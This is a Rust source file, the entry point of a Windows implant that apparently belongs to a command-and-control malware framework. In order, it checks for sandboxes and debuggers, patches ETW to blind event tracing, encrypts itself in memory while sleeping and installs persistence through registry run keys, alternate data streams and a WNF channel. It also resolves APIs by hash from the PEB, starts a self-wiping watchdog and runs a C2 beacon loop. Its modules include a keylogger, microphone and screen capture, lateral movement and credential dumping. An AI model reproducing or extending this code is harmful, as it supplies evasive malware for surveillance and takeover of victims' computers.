//! main.rs — Implant entry point
//!
//! Execution order:
//!   1. Anti-analysis checks   — bail out silently if sandbox/debugger detected
//!   2. ETW patch              — blind event-tracing hooks in the current process
//!   3. Sleep obfuscation      — encrypt implant image in memory during sleeps
//!   4. Persistence            — registry run-key + ADS drop
//!   5. Guardian thread        — watchdog that wipes on kill signal
//!   6. WNF persistence channel
//!   7. C2 beacon loop         — never returns

#![no_std]
#![no_main]
#![allow(unused_imports, dead_code)]

extern crate winapi;
extern crate windows;

mod antidetect;
mod c2;
mod dpapi;
mod etw_patch;
mod filetransfer;
mod guardian;
mod hashes;
mod hollow;
mod indirect_syscall;
mod keylog;
mod lateral;
mod loader;
mod mic;
mod pe_obfuscate;
mod persist;
mod post_shutdown;
mod ppldump;
mod resurrect;
mod sac_bypass;
mod screenshot;
mod selfdestruct;
mod sleep;
mod spoof;
mod stomp;
mod syscall;
mod threadless_inject;
mod token;
mod unhook;
mod utils;
mod watchdog;
mod defs;

// 16-byte AES key burned in by builder.py at build time.
static SLEEP_KEY: [u8; 16] = [
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
];

#[no_mangle]
pub unsafe extern "C" fn main() -> ! {
    // ------------------------------------------------------------------
    // 1. Anti-analysis checks.
    // ------------------------------------------------------------------
    if !antidetect::all_checks_pass() {
        // Silently exit — do not crash or print anything.
        winapi::um::processthreadsapi::ExitProcess(0);
    }

    // ------------------------------------------------------------------
    // 2. ETW patch — blind kernel-mode ETW in this process.
    // ------------------------------------------------------------------
    etw_patch::patch_etw();

    // ------------------------------------------------------------------
    // 3. Sleep obfuscation initialisation.
    // ------------------------------------------------------------------
    sleep::init(&SLEEP_KEY);

    // ------------------------------------------------------------------
    // 4. Persistence.
    // ------------------------------------------------------------------
    persist::install_all();
    resurrect::drop_to_ads(&[]);

    // ------------------------------------------------------------------
    // 5. Guardian watchdog thread.
    // ------------------------------------------------------------------
    // Spawn watchdog on a dedicated thread so it can wipe independently.
    {
        use winapi::um::processthreadsapi::CreateThread;
        extern "system" fn watchdog_thunk(_: *mut winapi::ctypes::c_void) -> u32 {
            unsafe { watchdog::run(&SLEEP_KEY) }
        }
        CreateThread(
            core::ptr::null_mut(), 0,
            Some(watchdog_thunk),
            core::ptr::null_mut(), 0,
            core::ptr::null_mut(),
        );
    }

    // ------------------------------------------------------------------
    // 6. WNF persistence channel.
    //    Resolve function pointers via PEB walk (no LoadLibrary).
    // ------------------------------------------------------------------
    {
        use post_shutdown::{
            NtSubscribeWnfStateChange, NtUpdateWnfStateData,
            RegOpenKeyExW, RegSetValueExW, RegCloseKey,
        };
        use crate::syscall::get_proc_from_peb;

        // djb2 hashes — module names lower-cased, export names as-is.
        const H_NTDLL:     u32 = 0x22D3B5ED;
        const H_ADVAPI:    u32 = 0x67208A49;
        const H_SUBSCRIBE: u32 = 0xC58338BB;
        const H_UPDATE:    u32 = 0xB56BFDD0;
        const H_OPEN:      u32 = 0x074A9772;
        const H_SET:       u32 = 0x34587300;
        const H_CLOSE:     u32 = 0x736B3702;

        let fn_subscribe: NtSubscribeWnfStateChange = core::mem::transmute(
            get_proc_from_peb(H_NTDLL, H_SUBSCRIBE).unwrap_or(core::ptr::null())
        );
        let fn_update: NtUpdateWnfStateData = core::mem::transmute(
            get_proc_from_peb(H_NTDLL, H_UPDATE).unwrap_or(core::ptr::null())
        );
        let fn_open: RegOpenKeyExW = core::mem::transmute(
            get_proc_from_peb(H_ADVAPI, H_OPEN).unwrap_or(core::ptr::null())
        );
        let fn_set: RegSetValueExW = core::mem::transmute(
            get_proc_from_peb(H_ADVAPI, H_SET).unwrap_or(core::ptr::null())
        );
        let fn_close: RegCloseKey = core::mem::transmute(
            get_proc_from_peb(H_ADVAPI, H_CLOSE).unwrap_or(core::ptr::null())
        );

        post_shutdown::install_wnf_channel(
            &[],           // no shellcode payload at boot — injected via C2
            &SLEEP_KEY,
            fn_subscribe,
            fn_update,
            fn_open,
            fn_set,
            fn_close,
        );
    }

    // ------------------------------------------------------------------
    // 7. C2 beacon loop — never returns.
    // ------------------------------------------------------------------
    c2::run()
}

#[panic_handler]
fn panic(_: &core::panic::PanicInfo) -> ! {
    unsafe { winapi::um::processthreadsapi::ExitProcess(1) }
}
